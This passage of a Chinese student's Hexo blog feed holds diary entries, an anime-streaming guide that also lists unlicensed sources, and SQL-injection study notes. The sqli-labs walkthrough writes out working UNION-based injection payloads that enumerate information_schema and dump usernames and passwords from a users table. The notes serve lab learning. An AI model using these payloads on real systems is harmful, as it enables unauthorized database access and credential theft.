href="https://www.cnblogs.com/GTL-JU/p/16054806.html">报错注入常用的三种注入方式</a></p></li><li><p><a href="https://blog.csdn.net/weixin_46706771/article/details/112768348">MYSQL 通过ExtractValue()报错注入</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="报错注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>也无风雨也无晴</title>
    <link href="http://example.com/2022/11/07/Diary_1107/"/>
    <id>http://example.com/2022/11/07/Diary_1107/</id>
    <published>2022-11-06T16:00:00.000Z</published>
    <updated>2022-11-07T17:32:42.170Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/violet--7.png" alt="violet"></p><span id="more"></span><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>回首向来萧瑟处，归去。也无风雨也无晴。</p><h1 id="没啥感受的一天"><a href="#没啥感受的一天" class="headerlink" title="没啥感受的一天"></a>没啥感受的一天</h1><p>诗是开始写这篇日志的时候才想起的。挺不错，一语双关咯。既形容了今天的天气，也形容了今天的感受。</p><p>上午早上八点的课，让人十分难以起床，毕竟晚上只睡了6h不到，起来后又不想用冷水洗脸，因为感冒。起得晚果不其然上课迟到了，虽然我不在意。</p><p>午餐时间身边一人向我倾诉一些关于友人与家庭的琐事，让我觉得人间之事真麻烦呀。我想我现在这样就够了。</p><p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p><p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/violet--7.png&quot; alt=&quot;violet&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之字符型和数字型判断</title>
    <link href="http://example.com/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/"/>
    <id>http://example.com/2022/11/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/</id>
    <published>2022-11-06T16:00:00.000Z</published>
    <updated>2022-11-07T16:15:45.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。</p><span id="more"></span><h1 id="数字型判断"><a href="#数字型判断" class="headerlink" title="数字型判断"></a>数字型判断</h1><p>假如数据库中的SQL语句是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br></pre></td></tr></table></figure><ol><li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1 时，两者为true即返回正常<br>当$id &#x3D; 1 and 1&#x3D;2 时，后者为false即返回错误</p></li><li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>单引号不匹配，因此返回错误<br>（说明：其它形式的符号也是类似情况）</p></li></ol><h1 id="字符型判断"><a href="#字符型判断" class="headerlink" title="字符型判断"></a>字符型判断</h1><p>假如数据库中的SQL语句是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br></pre></td></tr></table></figure><ol><li><p><strong>and</strong><br>当$id &#x3D; 1 and 1&#x3D;1  或 $id &#x3D; 1 and 1&#x3D;2 时，<br>因为有引号包裹，因此均返回正常</p></li><li><p><strong>加单引号</strong><br>假如$id &#x3D; 1’  在数据库中为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>多余的单引号不匹配，因此返回错误</p></li></ol><p>字符型可以通过闭合多余的单引号，使用注释符#或--+或%23</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="comment">--+&#x27;</span></span><br></pre></td></tr></table></figure><p>最后的引号被注释掉，实际运行效果是id&#x3D;’1’<br>因此返回正常</p><h1 id="字符型和数字型"><a href="#字符型和数字型" class="headerlink" title="字符型和数字型"></a>字符型和数字型</h1><p>通过以上分析，我们可以得出结论：</p><ul><li>当$id&#x3D;1 and 1&#x3D;2 时，<br>数字型返回错误，而字符型返回正常</li><li>当$id&#x3D;1’ 时，<br>二者均返回错误</li><li>当$id&#x3D;1’--+ 时，<br>数字型返回错误，而字符型返回正常</li></ul><p>注：or可以构造一个一直为true的语句，能返回正常。常用于万能密码</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_44798520/article/details/122453649">sql注入_字符型、数字型判断</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;学习SQL注入，应当对SQL语句较为熟悉，否则会比较懵。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="字符型" scheme="http://example.com/tags/%E5%AD%97%E7%AC%A6%E5%9E%8B/"/>
    
    <category term="数字型" scheme="http://example.com/tags/%E6%95%B0%E5%AD%97%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入之sqli-labs_1+2</title>
    <link href="http://example.com/2022/11/07/sqli-labs_1+2/"/>
    <id>http://example.com/2022/11/07/sqli-labs_1+2/</id>
    <published>2022-11-06T16:00:00.000Z</published>
    <updated>2022-11-07T17:00:13.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>直接做题很痛苦，看不懂也没有基础。去补了一节课才明白很多原理。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong></li></ol><ul><li>有提示。则存在SQL注入</li><li>无提示。不存在SQL注入<br>（说明：有提示即代表输入的数据带入到了数据库中查询，因此存在注入）<br>只有存在SQL注入才能继续往下执行。<br><img src="/simg/sqli-labs_1.png" alt="sqli-labs_1"></li></ul><ol start="2"><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>方法是：<br>首先输入：<br> ?id&#x3D;1 and 1&#x3D;2  或  ?id&#x3D;1’–+<br>由于之前我们已经输入过 ?id&#x3D;1’ 出现报错，<br>如果本次输入再次出现报错，说明是 数字型<br>否则即为 字符型</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong><br>为什么要猜解字段数？<br>因为我们已知存在SQL注入且其类型，可以使用联合查询注入。要使用联合注入首先得知道字段数。<br>（说明：联合查询Union:是把2个sql语句一起查询结果合并，且两张表需要有相同的列数和字段名，使用方式示例如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> A <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> B</span><br></pre></td></tr></table></figure><p>）<br>字段数可以通过order by语句得知。原理是通过order by语句查询，显示正常时是查询列数小于等于总列数。如果报错则该查询列数超过总列数。由此可得知字段数。示例语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆出显示位</strong><br>所谓爆出显示位，意思是查看分析哪些列是在页面显示的，这有利于我们后续的分析操作。<br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure><p>（说明：id&#x3D;-1的原因是为了让查询结果完全是union右边的值）</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>获取数据库名可以执行一些后续操作，获取版本号可以判断哪些数据库操作能做哪些不能做。<br><a href="https://blog.csdn.net/weixin_34678198/article/details/113273999">MYSQL版本简单区别</a><br>因此我们可以通过如下语句查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure><p>这里用到了mysql的系统函数，下面列举5个常用mysql注入系统函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()     MySQL版本</span><br><span class="line">user()       数据库用户名</span><br><span class="line">database()   数据库名</span><br><span class="line">@@datadir    数据库路径</span><br><span class="line">@@version_compile_os  操作系统版本</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong><br>首先需要介绍数据库默认库information_schema（5.0以上版本有该库）中的重要表</p></li></ol><ul><li><p>information_schema.schemata<br>schemata表中重要字段为schema_name，此字段涵盖数据库存在的所有库名字，我们可以通过查询语句得知我们想要的数据库都有哪些（database()只可得知当前数据库）<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema,schemata</span><br></pre></td></tr></table></figure><p>（说明：group_concat()的作用是将所有结果连接显示成一行）</p></li><li><p>information_schema.tables<br>tables表中重要字段为table_schema（库名）和table_name（表名）。可通过查询语句得到库名或表名，但由于table_schema与表字段table_name一一对应，有大量重复内容。只爆库建议使用schemata库查询<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_schema),group_concat(table_name) from information_schema.tables--+</span><br></pre></td></tr></table></figure><p>通过此方法可单独爆出某个数据库内的表名，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema like 0x646F75706870--+</span><br></pre></td></tr></table></figure><p>说明：通过匹配库爆表，需要将库名转换成哈希值或二进制，否则有时候会被转义从而报错</p></li><li><p>information_schema.columns<br>columns表中存在三个重要字段，分别为table_schema（库名字段）、table_name（表名字段）、column_name（字段）<br>可以直接利用这个表对数据库进行爆库爆表操作，只是仍然有很多重复字段，并不建议这么做。</p></li></ul><p>在本关中具体语句即为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><ol start="7"><li><p><strong>爆字段名</strong><br>通过sql语句查询知道当前数据库有4个表，根据表名知道可能用户的账号和密码是在users表中。因此接下来即为得到该表的字段名和内容。<br>示例语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p>说明：该语句查询information_schema数据库下的columns表的table_name字段。注意table_name字段在tables表和columns表中均存在。表示所有字段对应的表名。</p></li><li><p><strong>爆数据</strong><br>通过上述操作可知敏感字段username和password，接下来即查询该字段对应的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,id,password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>此笔记为笔者初学sql注入时所写</li><li>以上示例主要是第一关，第一关和第二关差别只在字符型和数字型</li></ul><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p><p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;直接做题很痛苦，看不懂也没有基础。去补了一节课才明白很多原理。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>惜</title>
    <link href="http://example.com/2022/11/06/Diary_1106/"/>
    <id>http://example.com/2022/11/06/Diary_1106/</id>
    <published>2022-11-05T16:00:00.000Z</published>
    <updated>2022-11-07T15:55:59.187Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p><h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol><li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li><li>上午9点体测，跳远和引体向上。排队等了一个小时。</li><li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li><li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li><li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li></ol><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png&quot; alt=&quot;凉宫春日&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>锦瑟</title>
    <link href="http://example.com/2022/11/05/Diary_1105/"/>
    <id>http://example.com/2022/11/05/Diary_1105/</id>
    <published>2022-11-04T16:00:00.000Z</published>
    <updated>2022-11-05T17:34:32.477Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p><span id="more"></span><h1 id="随便说点"><a href="#随便说点" class="headerlink" title="随便说点"></a>随便说点</h1><p>啊，今天是我第一天写日志。摸索中…</p><h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>今天突然回想起一首诗，是李商隐的《锦瑟》。我还蛮喜欢的。<br>      <strong>锦瑟</strong>  李商隐<br>锦瑟无端五十弦，一弦一柱思华年。<br>庄生晓梦迷蝴蝶，望帝春心托杜鹃。<br>沧海月明珠有泪，蓝田日暖玉生烟。<br>此情可待成追忆，只是当时已惘然。</p><p>一开始没想起来诗句，后面一想起来全托出来了。<br>上网搜的时候，看到了一个人评价这首诗–<strong>美在解与不解之中</strong><br>说得挺好的，换个词即为<strong>朦胧感</strong>。</p><h1 id="来说说今天做了什么吧。"><a href="#来说说今天做了什么吧。" class="headerlink" title="来说说今天做了什么吧。"></a>来说说今天做了什么吧。</h1><ol><li><p>上午python爬虫的网课，但课程是两年前的。因此导致很多地方对不上，即便照着参考代码写也会报错…虽然是因为我买了课没有及时学，但问群里的主讲老师也不会，这样的服务态度着实让我不适。网易云课堂上的大熊课堂python，讲得还是挺清晰，但布置的作业和视频上的代码都无法正常运行那也很糟糕。<br>给我的教训是：<em>买了有时效性的网课要及时学</em></p></li><li><p>下午睡了俩小时，午睡时间太长了。但半小时又会很快感觉困，高中的时候也没这样啊。看来还是压力不够，决定明天睡眠时间缩短到1h以内，如果感觉困，就用冷水浇醒自己。<br>先看看这样是否行得通吧。</p></li><li><p>之后看了Web安全的基础–SQL注入漏洞。今天主要是看书《Web安全深度剖析》，SQL注入这一章是看完了，看得比较快，倒懂不懂的感觉吧。主要是过一遍，明天看视频。</p></li><li><p>最后学了半小时JS。还是在网易云课堂上学的，看的leo老师的网课。讲得蛮清晰，目前感觉良好。</p></li><li><p>24:30的《孤独摇滚》动画更新了，看动画去了。</p></li></ol><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>日志写到这里，下次缩减一些，今天都写了半个多小时了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo.png&quot; alt=&quot;Holo&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>如何寻觅动画</title>
    <link href="http://example.com/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/"/>
    <id>http://example.com/2022/11/04/%E5%8A%A8%E6%BC%AB%E8%B5%84%E6%BA%90/</id>
    <published>2022-11-03T16:00:00.000Z</published>
    <updated>2022-11-04T15:52:12.001Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E9%98%BF%E5%BD%BB.gif" alt="托尔"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喜欢动画的人必不可少的，就是寻找能看动画的优质资源，本篇我就来梳理一下如何寻找动画资源，以我看番两年的经历来说说。字幕主要是（简中&amp;繁中）</p><h1 id="动画资源"><a href="#动画资源" class="headerlink" title="动画资源"></a>动画资源</h1><h2 id="正版资源"><a href="#正版资源" class="headerlink" title="正版资源"></a>正版资源</h2><ol><li><strong>bilibili港澳台区</strong><br>优点：</li></ol><ul><li>资源比较多，不用到处找</li><li>有弹幕和评论区，有分享的地方</li><li>除了独家代理，其它都可以免费观看<br>缺点：</li><li>在1080p资源中画质算是比较差的，压缩比较大</li><li>字幕样式比较丑，略影响观看</li><li>老番资源较少</li></ul><p>使用方式：<br>手机端：需要港澳台版的app，并设置代理(特指安卓，iphone不清楚)<br>电脑端：需要将设备地区设置为台湾(特指Windows 10，其它不清楚)<br><a href="https://www.bilibili.com/">bilibili港澳台</a></p><ol start="2"><li><strong>巴哈姆特动画疯</strong><br>优点：</li></ol><ul><li>绝大部分资源可以免费看。但需要等待30s广告，画质最高只有720p</li><li>资源比较多，不用到处找</li><li>有弹幕，可以分享</li><li>相较于bilibili港澳台大部分画质更佳</li><li>很多时候op，ed歌词都有翻译<br>缺点：</li><li>会员费较贵，即便连续开一年平均每月也需要20+RMB</li><li>弹幕素质较低，需要自设屏蔽词，比较麻烦</li><li>有时字幕过大，略影响观看</li><li>老番资源较少</li></ul><p>使用方式：<br>手机端：设置台湾地区代理，下载动画疯app<br>电脑端：设置台湾地区代理，打开动画疯网址<br><a href="https://ani.gamer.com.tw/">动画疯</a></p><ol start="3"><li><strong>Netflix</strong><br>优点：</li></ol><ul><li>画质好，没得说</li><li>资源也比较多</li><li>有自制动画。如：恶魔人，赛博朋克</li><li>可以跳过op和ed<br>缺点：</li><li>新番资源少</li><li>对代理的要求比较高</li></ul><p>使用方式：<br>手机端：设置代理，下载Netflix app<br>电脑端：设置代理，打开网页或下载UMP（UMP也需要代理）<br><a href="https://www.netflix.com/">Netflix</a></p><ol start="4"><li><strong>Disney+</strong><br>优点：<br>画质高<br>缺点：<br>资源少<br>新番不能及时更新</li></ol><p>观看方式：<br>手机端：购买会员，下载app<br>电脑端：购买会员，打开网站<br><a href="https://www.disneyplus.com/">Disney+</a></p><ol start="5"><li><strong>Yahoo TV</strong><br>优点：<br>免费的1080p新番木棉花资源<br>缺点：<br>资源少<br>只有台湾地区有</li></ol><p>观看方式：<br>电脑端：代理至台湾，打开网站<br>手机端：本人未成功过<br><a href="https://tw.tv.yahoo.com/">YahooTV</a></p><ol start="6"><li><strong>YouTube</strong></li></ol><ul><li>Ani-One 频道(最好在Singapore)<br>优点：<br>免费的1080p资源<br>有评论区<br>缺点：<br>资源少<br>少部分要频道会员</li></ul><p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上</p><p>还没有看过<strong>神之动画</strong>的快来看！</p><iframe width="560" height="315" src="https://www.youtube.com/embed/2C7Kp0yBpvo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p><a href="https://www.youtube.com/c/AniOneAsia">Ani-One频道</a></p><ul><li>木棉花 频道(最好在Taiwan)<br>优点：<br>免费的720p资源，直播时可有1080p<br>有评论区，直播时有实时评论<br>缺点：<br>资源少</li></ul><p>观看方式：<br>手机端：打开YouTube，搜索该频道<br>电脑端：同上<br><a href="https://www.youtube.com/c/AniOneAsia">木棉花台湾</a></p><ol start="7"><li><strong>AcFun</strong><br>优点：<br>免费的1080p资源<br>有b站没有的资源（如物语系列，摇曳露营）<br>有评论区和弹幕<br>缺点：<br>资源少</li></ol><p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可<br><a href="https://www.acfun.cn/">AcFun</a></p><ol start="8"><li><strong>mewatch</strong><br>优点：<br>免费的1080p资源<br>缺点：<br>资源数较少</li></ol><p>观看方式：<br>电脑端：换到新加坡代理，打开网站即可<br><a href="https://www.mewatch.sg/series/anime">mewatch</a></p><h2 id="非正版资源"><a href="#非正版资源" class="headerlink" title="非正版资源"></a>非正版资源</h2><ol><li><strong>Telegram</strong></li></ol><ul><li>NEP.Anime 频道<br>优点：<br>免费观看以及下载<br>收录了几乎从2018年末到现在的大部分资源<br>有小众资源<br>缺点：<br>2018年以前的资源很少</li></ul><p><a href="https://t.me/AnimeNep">NEP.Anime</a></p><ul><li>NC.Raws 频道<br>优点：<br>免费观看以及下载<br>新番一般时间延迟在10分钟内就有资源<br>资源质量偏高<br>有小众资源<br>缺点：<br>2021年以前的资源很少</li></ul><p><a href="https://t.me/NC_Raws_Channel">NC.Raws</a></p><ul><li>ANI 频道<br>优点：<br>免费观看以及下载<br>新番一般延迟在10分钟内就有资源<br>缺点：<br>需要下载观看，视网速快慢等待时间</li></ul><p><a href="https://t.me/channel_ani">ANI</a></p><p>观看方式：<br>手机端：下载Telegram，并搜索频道<br>电脑端：同上</p><ol start="2"><li><strong>Age网站</strong><br>优点：<br>资源比较多<br>站内有分类，有人气排名<br>缺点：<br>画质不一定好<br>有广告</li></ol><p>观看方式：<br>手机端：下载app即可<br>电脑端：打开网站即可</p><p><a href="https://www.agemys.net/">AGE</a></p><ol start="3"><li><strong>bt网站</strong><br>优点：<br>资源多<br>画质有的很好<br>缺点：<br>需要媒介下载后才能观看（比如迅雷，bit彗星），视情况等待时间较长</li></ol><p><a href="https://btbtt16.com/forum-index-fid-981-page-1.htm">BT动漫</a><br><a href="https://dongmanhuayuan.myheartsite.com/">动漫花园资源网</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>虽然使用非正版资源有时比正版资源还好，但我个人还是建议有足够经济能力的人至少为一个正版平台付费吧。尽管只有绵薄之力，本人也是在两个平台上付了年费的。<br>会为网络设置代理很重要，不仅是大陆地区。因为有些平台的资源是限制了在某个地区的。<br>有些平台并没有每个地区都尝试过，如果某个地区没有想要的资源请更换地区。(代理一般选择<strong>新加坡，台湾，香港，马来西亚</strong>)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E9%98%BF%E5%BD%BB.gif&quot; alt=&quot;托尔&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="动画" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/"/>
    
    <category term="资源" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="动画" scheme="http://example.com/tags/%E5%8A%A8%E7%94%BB/"/>
    
    <category term="资源" scheme="http://example.com/tags/%E8%B5%84%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/11/03/hello-world/"/>
    <id>http://example.com/2022/11/03/hello-world/</id>
    <published>2022-11-02T18:16:05.664Z</published>
    <updated>2022-11-03T15:21:15.090Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a 